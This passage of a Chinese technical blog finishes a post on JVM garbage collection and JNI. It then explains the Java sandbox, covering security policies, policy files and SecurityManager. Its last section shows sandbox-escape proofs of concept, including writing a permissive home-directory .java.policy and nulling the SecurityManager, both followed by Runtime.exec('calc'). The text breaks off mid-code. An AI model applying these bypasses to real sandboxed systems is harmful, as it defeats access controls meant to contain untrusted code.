Evacuation）：筛选回收阶段首先对各个Region的回收价值和成本进行排序，根据用户所期望的GC停顿时间来制定回收计划，这个阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分Region，时间是用户可控制的，而且停顿用户线程将大幅提高收集效率。 GC中的相关问题问题1：怎么定义活着的对象？从根引用开始，对象的内部属性可能也是引用，只要能级联到的都被认为是活着的对象。 问题2：什么是根？本地变量引用，操作数栈引用，PC寄存器，本地方法栈引用等这些都是根。 问题3：对象进入Old区域有什么坏处？Old区域一般称为老年代，老年代与新生代不一样。新生代，我们可以认为存活下来的对象很少，而老年代则相反，存活下来的对象很多，所以JVM的堆内存，才是我们通常关注的主战场，因为这里面活着的对象非常多，所以发生一次FULL GC，来找出来所有存活的对象是非常耗时的，因此，我们应该避免FULL GC的发生。 问题4：S0和S1一般多大，靠什么参数来控制，有什么变化？一般来说很小，我们大概知道它与Young差不多相差一倍的比例，设置的参数主要有两个： 12-XX:SurvivorRatio=8-XX:InitialSurvivorRatio=8 第一个参数（-XX:SurvivorRatio）是Eden和Survivous区域比重（注意Survivous一般包含两个区域S0和S1，这里是一个Survivous的大小）。如果将-XX:SurvivorRatio=8设置为8，则说明Eden区域是一个Survivous区的8倍，换句话说S0或S1空间是整个Young空间的1/10，剩余的8/10由Eden区域来使用。 第二个参数（-XX:InitialSurvivorRatio）是Young/S0的比值，当其设置为8时，表示S0或S1占整个Young空间的1/8（或12.5%）。 问题5：一个对象每次Minor GC时，活着的对象都会在S0和S1区域转移，讲过MInor GC多少次后，会进入Old区域呢？默认是15次，参数设置 1--XX:MaxTenuringThreshold=15 计数器会在对象的头部记录它的交换次数。 问题6：为什么发生FULL GC会带来很大的危害？在发生FULL GC的时候，意味着JVM会安全的暂停所有正在执行的线程（Stop The World），来回收内存空间，在这个时间内，所有除了回收垃圾的线程外，其他有关JAVA的程序，代码都会静止，反映到系统上，就会出现系统响应大幅度变慢，卡机等状态。 问题7：JVM GC回收哪个区域内的垃圾？需要注意的是，JVM GC只回收堆区和方法区内的对象。而栈区的数据，在超出作用域后会被JVM自动释放掉，所以其不在JVM GC的管理范围内。 问题8：JVM GC怎么判断对象可以被回收了？ 对象没有引用 作用域发生未捕获异常 程序在作用域正常执行完毕 程序执行了System.exit() 程序发生意外终止（被杀线程等） 在Java程序中不能显式的分配和注销缓存，因为这些事情JVM都帮我们做了，那就是GC。 有些时候我们可以将相关的对象设置成null 来试图显示的清除缓存，但是并不是设置为null 就会一定被标记为可回收，有可能会发生逃逸。 将对象设置成null 至少没有什么坏处，但是使用System.gc() 便不可取了，使用System.gc() 时候并不是马上执行GC操作，而是会等待一段时间，甚至不执行，而且System.gc() 如果被执行，会触发Full GC ，这非常影响性能。 问题9：JVM GC什么时候执行？Eden区空间不够存放新对象的时候，执行Minro GC。升到老年代的对象大于老年代剩余空间的时候执行Full GC，或者小于的时候被HandlePromotionFailure 参数强制Full GC 。调优主要是减少 Full GC 的触发次数，可以通过 NewRatio 控制新生代转老年代的比例，通过MaxTenuringThreshold 设置对象进入老年代的年龄阀值（后面会介绍到）。 0x06 本地方法接口简介JNI（Java Native Interface），本地方法接口。 简单来讲，一个Native Method就是一个Java调用非Java代码的接口，一个Native Method是这样一个Java方法：该方法的底层实现由非Java语言实现，比如C。这个特征并非Java特有，很多其他的编程语言都有这一机制，比如在C++中，你可以用extern “C” 告知C++编译器去调用一个C的函数。 在定义一个native method时，并不提供实现体（有些像定义一个Java interface），因为其实现体是由非Java语言在外面实现的。 本地接口的作用是融合不同的编程语言为Java所用，它的初衷是融合C/C++程序。 标识符native可以与其他所有的Java标识符连用，但是abstract除外。 123456789101112131415161718/** * 本地方法 */public class IHaveNatives &#123; //abstract 没有方法体 public abstract void abstractMethod(int x); //native 和 abstract不能共存，native是有方法体的，由C语言来实现 public native void Native1(int x); native static public long Native2(); native synchronized private float Native3(Object o); native void Native4(int[] array) throws Exception;&#125; 为何使用JNIJava使用起来非常方便，然而有些层次的任务用Java实现起来不容易，或者我们对程序的效率很在意时，问题就来了。 与Java环境外交互：有时Java应用需要与Java外面的环境交互，这是本地方法存在的主要原因。 你可以想想Java需要与一些底层系统，如擦偶偶系统或某些硬件交换信息时的情况。本地方法正式这样的一种交流机制：它为我们提供了一个非常简洁的接口，而且我们无需去了解Java应用之外的繁琐细节。 与操作系统交互（比如线程最后要回归于操作系统线程）：JVM支持着Java语言本身和运行库，它是Java程序赖以生存的平台，它由一个解释器（解释字节码）和一些连接到本地代码的库组成。然而不管怎样，它毕竟不是一个完整的系统，它经常依赖于一些底层系统的支持。这些底层系统常常是强大的操作系统。通过使用本地方法，我们得以用Java实现了jre的与底层系统的交互，甚至JVM的一些部分就是用C写的。还有，如果我们要使用一些Java语言本身没有提供封装的操作系统特性时，我们也需要使用本地方法。 Sun’s Java：Sun的解释器是用C实现的，这使得它能像一些普通的C一样与外部交互。jre大部分是用Java实现的，它也通过一些本地方法与外界交互。例如：类java.lang.Thread的setPriority()方法是用Java实现的，但是它实现调用的是该类里的本地方法setPriority0()。这个本地方法是用C实现的，并被植入JVM内部，在Windows 95的平台上，这个本地方法最终将调用Win32 setPriority() API。这是一个本地方法的具体实现由JVM直接提供，更多的情况是本地方法由外部的动态链接库（external dynamic link library）提供，然后被JVM调用。 0x07 执行引擎参考：JVM字节码执行引擎","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"浅析Java沙箱逃逸","date":"2020-05-03T08:11:24.000Z","path":"2020/05/03/浅析Java沙箱逃逸/","text":"0x01 Java沙箱程序员编写一个Java程序，默认的情况下可以访问该机器的任意资源，比如读取、删除一些文件或者网络操作等。当你把程序部署到正式的服务器上，系统管理员要为服务器的安全承担责任，那么他可能不敢确定你的程序会不会访问不该访问的资源，为了消除潜在的安全隐患，他可能有两种办法： 让你的程序在一个限定权限的帐号下运行。 利用Java的沙箱机制来限定你的程序不能为非作歹。以下用于介绍该机制。 Java沙箱简介Java安全模型的核心就是Java沙箱（sandbox），什么是沙箱？沙箱是一个限制程序运行的环境。限制程序运行一方面是为了保护系统资源，同时另一方面也为了保护程序自己。沙箱主要限制系统资源访问，那系统资源包括什么？——CPU、内存、文件系统、网络。不同级别的沙箱对这些资源访问的限制也可以不一样。 所有的Java程序运行都可以指定沙箱，可以定制安全策略。 Java中的安全模型在Java中将执行程序分成本地代码和远程代码两种，本地代码默认视为可信任的，而远程代码则被看作是不受信的。对于授信的本地代码，可以访问一切本地资源。而对于非授信的远程代码在早期的Java实现中，安全依赖于沙箱 (Sandbox) 机制。如下图： 但如此严格的安全机制也给程序的功能扩展带来障碍，比如当用户希望远程代码访问本地系统的文件时候，就无法实现。因此在后续的 Java1.1 版本中，针对安全机制做了改进，增加了安全策略，允许用户指定代码对本地资源的访问权限。如下图： 在 Java1.2 版本中，再次改进了安全机制，增加了代码签名。不论本地代码或是远程代码，都会按照用户的安全策略设定，由类加载器加载到虚拟机中权限不同的运行空间，来实现差异化的代码执行权限控制。如下图： 当前最新的安全机制实现，则引入了域 (Domain) 的概念。虚拟机会把所有代码加载到不同的系统域和应用域，系统域部分专门负责与关键资源进行交互，而各个应用域部分则通过系统域的部分代理来对各种需要的资源进行访问。虚拟机中不同的受保护域 (Protected Domain)，对应不一样的权限 (Permission)。存在于不同域中的类文件就具有了当前域的全部权限，如下图： 以上提到的都是基本的Java安全模型概念，在应用开发中还有一些关于安全的复杂用法，其中最常用到的API就是doPrivileged()。doPrivileged()方法能够使一段受信任代码获得更大的权限，甚至比调用它的应用程序还要多，可做到临时访问更多的资源。有时候这是非常必要的，可以应付一些特殊的应用场景。例如，应用程序可能无法直接访问某些系统资源，但这样的应用程序必须得到这些资源才能够完成功能。 Java沙箱的基本组成Java沙箱由以下几部分组成： 字节码校验器（bytecode verifier）：确保Java类文件遵循Java语言规范。这样可以帮助Java程序实现内存保护。但是不是所有的类文件都会经过字节码校验，比如核心类。 类加载器（class loader）：所有的Java类都是通过类加载器加载的，可以自定义类加载器来设置加载类的权限。 存取控制器（access controller）：存取控制器可以控制核心API对操作系统的存取权限，而这个控制的策略设定，可以由用户指定。 安全管理器（security manager）：是核心API和操作系统之间的主要接口。实现权限控制，比存取控制器优先级高。 安全软件包（security package）：java.security下的类和扩展包下的类，允许用户为自己的应用增加新的安全特性，包括： 安全提供者 消息摘要 数字签名 加密 鉴别 其中ClassLoader在如下三个方面对Java沙箱起作用： 它防止恶意代码去干涉善意的代码； 它守护了被信任的类库边界； 它将代码归入保护域，确定了代码可以进行哪些操作。 虚拟机为不同的ClassLoader载入的类提供不同的命名空间，命名空间由一系列唯一的名称组成，每一个被装载的类将有一个名字，这个命名空间是由Java虚拟机为每一个ClassLoader维护的，它们互相之间甚至不可见。 ClassLoader采用的机制是双亲委派模式。从最内层JVM自带ClassLoader开始加载，外层恶意同名类得不到加载从而无法使用；由于严格通过包来区分了访问域，外层恶意的类通过内置代码也无法获得权限访问到内层类，破坏代码就自然无法生效。 Java沙箱的要素权限权限是指允许代码执行的操作。包含三部分：权限类型、权限名和允许的操作。权限类型是实现了权限的Java类名，是必需的。权限名一般就是对哪类资源进行操作的资源定位（比如一个文件名或者通配符、网络主机等），一般基于权限类型来设置，有的比如java.security.AllPermission不需要权限名。允许的操作也和权限类型对应，指定了对目标可以执行的操作行为，比如读、写等。 123permission java.security.AllPermission; //权限类型permission java.lang.RuntimePermission \"stopThread\"; //权限类型+权限名permission java.io.FilePermission \"/tmp/foo\" \"read\"; //权限类型+权限名+允许的操作 标准权限如下表： 说明 类型 权限名 操作 例子 文件权限 java.io.FilePermission 文件名（平台依赖） 读、写、删除、执行 允许所有文件的读写删除执行：permission java.io.FilePermission “&lt;&lt; ALL FILES&gt;&gt;”, “read,write,delete,execute”;。允许对用户主目录的读：permission java.io.FilePermission “${user.home}/-“, “read”; 套接字权限 java.net.SocketPermission 主机名:端口 接收、监听、连接、解析 允许实现所有套接字操作：permission java.net.SocketPermission “:1-“, “accept,listen,connect,resolve”;。允许建立到特定网站的连接：permission java.net.SocketPermission “.abc.com:1-“, “connect,resolve”; 属性权限 java.util.PropertyPermission 需要访问的jvm属性名 读、写 读标准Java属性：permission java.util.PropertyPermission “java.”, “read”;。在sdo包中创建属性：permission java.util.PropertyPermission “sdo.”, “read,write”; 运行时权限 java.lang.RuntimePermission 多种权限名[见附录A] 无 允许代码初始化打印任务：permission java.lang.RuntimePermission “queuePrintJob” AWT权限 java.awt.AWTPermission 6种权限名[见附录B] 无 允许代码充分使用robot类：permission java.awt.AWTPermission “createRobot”; permission java.awt.AWTPermission “readDisplayPixels”; 网络权限 java.net.NetPermission 3种权限名[见附录C] 无 允许安装流处理器：permission java.net.NetPermission “specifyStreamHandler”;。 安全权限 java.security.SecurityPermission 多种权限名[见附录D] 无 序列化权限 java.io.SerializablePermission 2种权限名[见附录E] 无 反射权限 java.lang.reflect.ReflectPermission suppressAccessChecks（允许利用反射检查任意类的私有变量） 无 完全权限 java.security.AllPermission 无（拥有执行任何操作的权限） 无 代码源代码源是类所在的位置，表示为URL地址。 保护域保护域用来组合代码源和权限，这是沙箱的基本概念。保护域就在于声明了比如由代码A可以做权限B这样的事情。 策略文件策略文件是控制沙箱的管理要素，一个策略文件包含一个或多个保护域的项。策略文件完成了代码权限的指定任务，策略文件包括全局和用户专属两种。 JVM可以使用多个策略文件，不过一般来说下面两个最为常用。一个是全局的$JREHOME/lib/security/java.policy，作用于JVM的所有实例；另一个是用户自己的，可以存储到用户的主目录下。策略文件可以使用JDK自带的policytool工具编辑。 java.policy我们看下默认的java.policy文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// Standard extensions get all permissions by defaultgrant codeBase &quot;file:$&#123;&#123;java.ext.dirs&#125;&#125;/*&quot; &#123; permission java.security.AllPermission;&#125;;// default permissions granted to all domainsgrant &#123; // Allows any thread to stop itself using the java.lang.Thread.stop() // method that takes no argument. // Note that this permission is granted by default only to remain // backwards compatible. // It is strongly recommended that you either remove this permission // from this policy file or further restrict it to code sources // that you specify, because Thread.stop() is potentially unsafe. // See the API specification of java.lang.Thread.stop() for more // information. permission java.lang.RuntimePermission &quot;stopThread&quot;; // allows anyone to listen on dynamic ports permission java.net.SocketPermission &quot;localhost:0&quot;, &quot;listen&quot;; // &quot;standard&quot; properies that can be read by anyone permission java.util.PropertyPermission &quot;java.version&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.vendor&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.vendor.url&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.class.version&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;os.name&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;os.version&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;os.arch&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;file.separator&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;path.separator&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;line.separator&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.specification.version&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.specification.vendor&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.specification.name&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.vm.specification.version&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.vm.specification.vendor&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.vm.specification.name&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.vm.version&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.vm.vendor&quot;, &quot;read&quot;; permission java.util.PropertyPermission &quot;java.vm.name&quot;, &quot;read&quot;;&#125;; 策略文件的内容格式就是这样，grant授权允许操作某个权限。这个默认的策略文件就指明了JDK扩展包可以有全部权限，允许代码stop线程，允许监听1099端口(1099号端口，是默认的服务器端RMI监听端口)等等。 配置基本原则： 在启用安全管理器的时候，配置遵循以下基本原则： 没有配置的权限表示没有。 只能配置有什么权限，不能配置禁止做什么。 同一种权限可多次配置，取并集。 统一资源的多种权限可用逗号分割。 默认配置文件解释： 第一部分授权：授权基于路径在file:$/*的class和jar包，所有权限。 123grant codeBase &quot;file:$&#123;&#123;java.ext.dirs&#125;&#125;/*&quot; &#123; permission java.security.AllPermission;&#125;; 第二部分授权：这是细粒度的授权，对某些资源的操作进行授权。具体不再解释，可以查看javadoc 1234grant &#123; permission java.lang.RuntimePermission &quot;stopThread&quot;; …… &#125; 补充：当批量配置的时候（例如第一部分授权），有三种模式： directory/表示directory目录下的所有.class文件，不包括.jar文件； directory/*表示directory目录下的所有的.class及.jar文件； directory/-表示directory目录下的所有的.class及.jar文件，包括子目录； 可以通过${}来引用系统属性，如： file:$/* java.security另一个很重要的是参数文件——java.security，这个文件和策略文件在同一个目录下。这个参数文件定义了沙箱的一些参数。比如默认的沙箱文件是这样的，只截取部分内容： 1234567891011121314# The default is to have a single system-wide policy file,# and a policy file in the user&apos;s home directory.policy.url.1=file:$&#123;java.home&#125;/lib/security/java.policypolicy.url.2=file:$&#123;user.home&#125;/.java.policy# whether or not we expand properties in the policy file# if this is set to false, properties ($&#123;...&#125;) will not be expanded in policy# files.policy.expandProperties=true# whether or not we allow an extra policy to be passed on the command line# with -Djava.security.policy=somefile. Comment out this line to disable# this feature.policy.allowSystemProperty=true policy.url.*这个属性指明了使用的策略文件，如上文所述，默认的两个位置就在这里配置，用户可以自行更改顺序和存储位置。而policy.allowSystemProperty指明是否允许用户自行通过命令行指定policy文件。 密钥库保存密钥证书的地方。 默认沙箱通过Java命令行启动的Java应用程序，默认不启用沙箱。要想启用沙箱，启动命令需要做如下形式的变更： 1java -Djava.security.manager &lt;other args&gt; 沙箱启动后，安全管理器会使用两个默认的策略文件来确定沙箱启动参数。当然也可以通过命令指定： 1java -Djava.security.policy=&lt;URL&gt; 如果要求启动时只遵循一个策略文件，那么启动参数要加个等号，如下： 1java -Djava.security.policy==&lt;URL&gt; Java沙箱的应用限制读文件这个例子很简单，首先写一个r.txt文件，里面的内容是“abcd”，再写个程序如下读取这个r.txt。 12345678910111213141516171819202122232425262728import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.InputStream;public class PolicyTest &#123; public static void file() &#123; File f = new File(\"D:\\\\github\\\\CDLib\\\\src\\\\main\\\\resources\\\\security\\\\r.txt\"); InputStream is; try &#123; is = new FileInputStream(f); byte[] content = new byte[1024]; while (is.read(content) != -1) &#123; System.out.println(new String(content)); &#125; &#125; catch (FileNotFoundException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; // test read file. file(); &#125;&#125; 发现输出是abcd。 接下来修改Java启动参数，加入-Djava.security.manager，启动了安全沙箱。再运行，输出变成了异常： 1234567Exception in thread &quot;main&quot; java.security.AccessControlException: access denied (&quot;java.io.FilePermission&quot; &quot;D:\\github\\CDLib\\src\\main\\resources\\security\\r.txt&quot; &quot;read&quot;)at java.security.AccessControlContext.checkPermission(Unknown Source)at java.security.AccessController.checkPermission(Unknown Source)at java.lang.SecurityManager.checkPermission(Unknown Source)at java.lang.SecurityManager.checkRead(Unknown Source)at java.io.FileInputStream.(Unknown Source)at com.taobao.cd.security.PolicyTest.main(PolicyTest.java:15) 这里已经提示了，访问被拒绝，说明了沙箱启动，同时也验证了默认沙箱——禁止本地文件访问。 再来，我们构建一个custom.policy文件如下： 123grant &#123; permission java.io.FilePermission &quot;D:\\\\github\\\\CDLib\\\\src\\\\main\\\\resources\\\\security\\\\*&quot;, &quot;read&quot;;&#125;; 这里构建了一条安全策略——允许读取security目录下的文件。 修改启动命令，添加-Djava.security.policy=D:\\\\github\\\\CDLib\\\\src\\\\main\\\\resources\\\\security\\\\custom.policy，再执行，结果输出了abcd。 如上例。我们通过自定义policy文件修改了默认沙箱的安全策略，再通过启动参数开启沙箱模式。这样就可以构造我们自己想要的沙箱效果了。 限制访问网络通过HttpClient访问www.baidu.com。 12345678910111213141516171819202122232425import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.InputStream;import com.taobao.cd.http.util.HttpUtil;public class PolicyTest &#123; public static void network() &#123; try &#123; String text = HttpUtil.createHtmlText(\"http://www.baidu.com\", HttpUtil.UA); System.out.println(text); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; // test use network. network(); &#125;&#125; 开启默认沙箱后，输出如下： 1234567891011121314151617181920java.security.AccessControlException: access denied (&quot;java.net.SocketPermission&quot; &quot;www.baidu.com&quot; &quot;resolve&quot;)at java.security.AccessControlContext.checkPermission(Unknown Source)at java.security.AccessController.checkPermission(Unknown Source)at java.lang.SecurityManager.checkPermission(Unknown Source)at java.lang.SecurityManager.checkConnect(Unknown Source)at java.net.InetAddress.getAllByName0(Unknown Source)at java.net.InetAddress.getAllByName(Unknown Source)at java.net.InetAddress.getAllByName(Unknown Source)at org.apache.http.impl.conn.DefaultClientConnectionOperator.resolveHostname(DefaultClientConnectionOperator.java:242)at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:130)at org.apache.http.impl.conn.AbstractPoolEntry.open(AbstractPoolEntry.java:149)at org.apache.http.impl.conn.AbstractPooledConnAdapter.open(AbstractPooledConnAdapter.java:121)at org.apache.http.impl.client.DefaultRequestDirector.tryConnect(DefaultRequestDirector.java:573)at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:425)at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:820)at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:754)at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:732)at com.taobao.cd.http.util.HttpUtil.createHtmlText(HttpUtil.java:38)at com.taobao.cd.security.PolicyTest.network(PolicyTest.java:15)at com.taobao.cd.security.PolicyTest.main(PolicyTest.java:45) 根据错误提示，知道是访问socket没有权限。那么修改下policy，指定权限： 123grant &#123; permission java.net.SocketPermission &quot;www.baidu.com:1-&quot;, &quot;connect,resolve&quot;;&#125;; 在指定权限文件下再运行，得到了正常的text形式的baidu首页的页面文档。权限策略成功。 0x02 Java Security Manager简介作为Java沙箱的基本组成部分之一，Java安全管理器是核心API和操作系统之间的主要接口，主要用于实现权限控制。 安全管理器是一个允许应用实现一种安全策略的类。它允许一个应用去明确在执行一个可能安全或者敏感的操作之前，此操作是否允许在一个安全的上下文中被执行。应用可以同意或者拒绝执行操作。 SecurityManager类方法SecurityManager类包含许多以check开头命名的方法。Java库中的各种方法在执行一些敏感的操作时可以调用这些方法。对check方法典型的调用如下： 1234SecurityManager security = System.getSecurityManager();if (security != null) &#123; security.checkXXX(argument);&#125; SecurityManager通过抛出异常来阻止没有权限或敏感操作的完成。 如果操作被允许执行，则简单的返回；如果操作被拒绝，则抛出一个SecurityException。对于这种处理方式唯一的例外就是checkTopLevelWindow()方法，此方法返回boolean值。 设置、获取当前管理器： 可以使用System类的setSecurityManager()方法来设置当前安全管理器； 可以使用System类的getSecurityManager()方法来获取当前安全管理器； SecurityManager中特定的方法checkPermission(java.security.Permission)负责明确允许还是拒绝由指定权限所指示的访问请求，默认的实现是： 1AccessController.checkPermission(perm); 若果一个请求访问被允许，则checkPermission()直接返回；如果被拒绝，则抛出一个SecurityException异常。 从Java 2 SDK v1.2 开始，SecurityManager 中其他所有check方法的默认实现都是调用SecurityManager的checkPermission()方法来确定调用线程是否具有执行所请求操作的权限。 注意：只带有单个权限参数的checkPermission()方法总是在当前执行的线程上下文中执行安全检查。有时，应该在给定上下文中进行的安全检查实际上需要在不同的上下文（例如，在一个辅助线程中）中进行。Java为这种情况提供了包含有上下文参数的getSecurityContext()方法和checkPermission()方法。 getSecurityContext()方法返回当前调用上下文的一个“快照”（默认的实现返回一个 AccessControlContext 对象）。下面是一个示例调用： 123Object context = null;SecurityManager sm = System.getSecurityManager();if (sm != null) context = sm.getSecurityContext(); checkPermission()方法使用一个上下文对象，以及根据该上下文而不是当前执行线程的上下文作出访问决策的权限。因此另一个上下文中的代码可以调用此方法，传递权限和以前保存的上下文对象。下面是一个示例调用，它使用了以前示例中获得的SecurityManager类实例sm： 1if (sm != null) sm.checkPermission(permission, context); SecurityManager类的主要方法列表如下，分别囊括了文件的读写删除和执行、网络的连接和监听、线程的访问、以及其他包括打印机剪贴板等系统功能： 12345678910111213141516171819202122232425262728293031checkAccept(String, int)checkAccess(Thread)checkAccess(ThreadGroup)checkAwtEventQueueAccess()checkConnect(String, int)checkConnect(String, int, Object)checkCreateClassLoader()checkDelete(String)checkExec(String)checkExit(int)checkLink(String)checkListen(int)checkMemberAccess(Class&lt;?&gt;, int)checkMulticast(InetAddress)checkMulticast(InetAddress, byte)checkPackageAccess(String)checkPackageDefinition(String)checkPermission(Permission)checkPermission(Permission, Object)checkPrintJobAccess()checkPropertiesAccess()checkPropertyAccess(String)checkRead(FileDescriptor)checkRead(String)checkRead(String, Object)checkSecurityAccess(String)checkSetFactory()checkSystemClipboardAccess()checkTopLevelWindow(Object)checkWrite(FileDescriptor)checkWrite(String) 启动安全管理器参数启动启动程序的时候通过附加参数启动安全管理器： 1-Djava.security.manager 如果想指定自定义的实现，可以在java.security.manager加等号指定，如下就能指定net.sourceforge.prograde.sm.ProGradeJSM作为实现： 1-Djava.security.manager=net.sourceforge.prograde.sm.ProGradeJSM 若要同时指定配置文件的位置那么示例如下： 1-Djava.security.manager -Djava.security.policy=&quot;E:/java.policy&quot; 策略文件前面小节已经说过了。一般需要指定哪些类有哪些权限，编辑policy文件就可以了。policy文件的具体语法参看这里。 编码方式启动也可以通过编码方式启动，不过不建议： 12SecurityManager sm = new SecurityManager(); System.setSecurityManager(sm); 通过参数启动，本质上也是通过编码启动，不过参数启动使用灵活。 关闭安全管理器程序关闭： 12SecurityManager sm = System.getSecurityManager(); if(sm != null)&#123; System.setSecurityManager(null); &#125; 注意：上面的代码只有在位于${JDK_HOME}/jre/lib/security目录下或者其他指定目录下的java.policy文件中指定了一个权限才会奏效。 这个权限是: 1permission java.lang.RuntimePermission &quot;setSecurityManager&quot;; DemoFileUtil.java，工具类用于创建文件夹： 12345678910111213141516171819202122232425262728293031import java.io.File;import java.io.IOException;import java.security.AccessControlException;import java.security.AccessController;import java.security.PrivilegedAction;public class FileUtil &#123; private static final String FOLDER_PATH = \"C:\\\\test\"; public FileUtil() &#123; &#125; public static void makeFile(String fileName) &#123; try &#123; File fs = new File(\"C:\\\\test\\\\\" + fileName); fs.createNewFile(); &#125; catch (IOException | AccessControlException var2) &#123; var2.printStackTrace(); &#125; &#125; public static void doPrivilegedAction(final String fileName) &#123; AccessController.doPrivileged(new PrivilegedAction&lt;String&gt;() &#123; public String run() &#123; FileUtil.makeFile(fileName); return null; &#125; &#125;); &#125;&#125; DemoDoPrivilege.java，尝试通过三种方式在指定文件夹下创建新文件： 12345678910111213141516171819202122232425262728293031323334353637import java.io.File;import java.io.IOException;import java.security.AccessControlException;public class DemoDoPrivilege &#123; public DemoDoPrivilege() &#123; &#125; public static void main(String[] args) &#123; System.out.println(\"***************************************\"); System.out.println(\"I will show AccessControl functionality...\"); System.out.println(\"Preparation step : turn on system permission check...\"); System.out.println(\"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"); System.out.println(\"Create a new file named temp1.txt via privileged action ...\"); FileUtil.doPrivilegedAction(\"temp1.txt\"); System.out.println(\"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"); System.out.println(); System.out.println(\"/////////////////////////////////////////\"); System.out.println(\"Create a new file named temp2.txt via File ...\"); try &#123; File fs = new File(\"C:\\\\test\\\\temp2.txt\"); fs.createNewFile(); &#125; catch (AccessControlException | IOException var2) &#123; var2.printStackTrace(); &#125; System.out.println(\"/////////////////////////////////////////\"); System.out.println(); System.out.println(\"-----------------------------------------\"); System.out.println(\"create a new file named temp3.txt via FileUtil ...\"); FileUtil.makeFile(\"temp3.txt\"); System.out.println(\"-----------------------------------------\"); System.out.println(); System.out.println(\"***************************************\"); &#125;&#125; my.policy，自定义的权限配置文件，本地放在和前面文件同一目录下： 123456789grant&#123; permission java.io.FilePermission &quot;C:\\\\test\\\\*&quot;, &quot;write&quot;;&#125;;或grant&#123; permission java.security.AllPermission &quot;C:\\\\test\\\\*&quot;;&#125;; 启动安全管理器运行该类，由于权限问题会报java.security.AccessControlException的错误： 1java -Djava.security.manager DemoDoPrivilege 配置权限参数-Djava.security.policy=my.policy，再次启动则创建成功： 0x03 Java沙箱逃逸由前面Java沙箱的基础组成部分知道，除了Java安全管理器外，其他的基本都是内置实现在JVM和Java语言中的，也就是说，只有Java安全管理器可以被外部用户控制来设置策略文件等。因此，Java沙箱逃逸，实际就是针对Java Security Manager的绕过。 利用单等号+home目录可写绕过Bypass利用jre/lib/security/java.security是Java中指定安全配置文件，在前面的java.security小节中看到，其中指定了两个默认的policy文件： 1234# The default is to have a single system-wide policy file,# and a policy file in the user&apos;s home directory.policy.url.1=file:$&#123;java.home&#125;/lib/security/java.policypolicy.url.2=file:$&#123;user.home&#125;/.java.policy 而通过-Djava.security.policy指定policy文件时，如果参数后面是一个等号，例如-Djava.security.policy=my.policy，m.policy会加在上面的两个默认的policy文件之后。在默认情况下，home目录下没有.java.policy这个文件。因此，如果home目录可写，则恶意代码可以通过写.java.policy文件，授予自己更多的权限来绕过Java Security Manager。 假设开发者自定义的策略文件my.policy，虽然没有赋予文件的执行权限，但允许home目录可写： 123grant&#123; permission java.io.FilePermission &quot;C:\\\\Users\\\\Administrator\\\\*&quot;, &quot;write&quot;;&#125;; BypassSandbox类，利用my.policy策略文件允许在home目录可写的设置，将该目录上写入.java.policy文件，其中的策略内容未授权所有文件具有可执行权限： 12345678910import java.io.FileWriter;public class BypassSandbox &#123; public static void main(String[] args) throws Exception &#123; String homePolicyFile = \"grant &#123;\\n permission java.io.FilePermission \\\"&lt;&lt;ALL FILES&gt;&gt;\\\", \\\"execute\\\";\\n&#125;;\"; FileWriter writer = new FileWriter(\"C:\\\\Users\\\\Administrator\\\\.java.policy\"); writer.write(homePolicyFile); writer.close(); &#125;&#125; Exploit类，恶意类，执行calc命令弹计算器： 12345public class Exploit &#123; public static void main(String[] args) throws Exception &#123; Runtime.getRuntime().exec(\"calc\"); &#125;&#125; 先运行Exploit类是不能成功执行的，被Java安全管理器限制了；然后执行BypassSandbox类往home目录上写.java.policy这个默认策略文件，其中内容为允许所有文件具有可执行权限；最后再次运行Exploit类就能成功弹计算器了： 123java -Djava.security.manager -Djava.security.policy=&quot;E:\\\\my.policy&quot; Exploitjava -Djava.security.manager -Djava.security.policy=&quot;E:\\\\my.policy&quot; BypassSandboxjava -Djava.security.manager -Djava.security.policy=&quot;E:\\\\my.policy&quot; Exploit 修复方法-Djava.security.policy==java.policy，用双等于号指定policy文件。 利用setSecurityManager绕过Bypass利用Java Security Manager不仅能通过参数-Djava.security.policy==java.policy指定，还可以在运行时通过System.setSecurityManager()方法指定。如果被授予setSecurityManager权限，恶意代码可以在运行时调用setSecurityManager()方法，将Java Security Manager置为null即使安全管理器失效，从而实现绕过。 假设开发者自定义的策略文件my.policy，设置了setSecurityManager权限： 123grant &#123; permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;&#125;; BypassSandbox类，关键在于System.setSecurityManager(null)使得安全管理器失效来实现绕过： 123456public class BypassSandbox &#123; public static void main(String[] args) throws Exception &#123; System.setSecurityManager(null); Runtime.getRuntime().exec(\"calc\"); 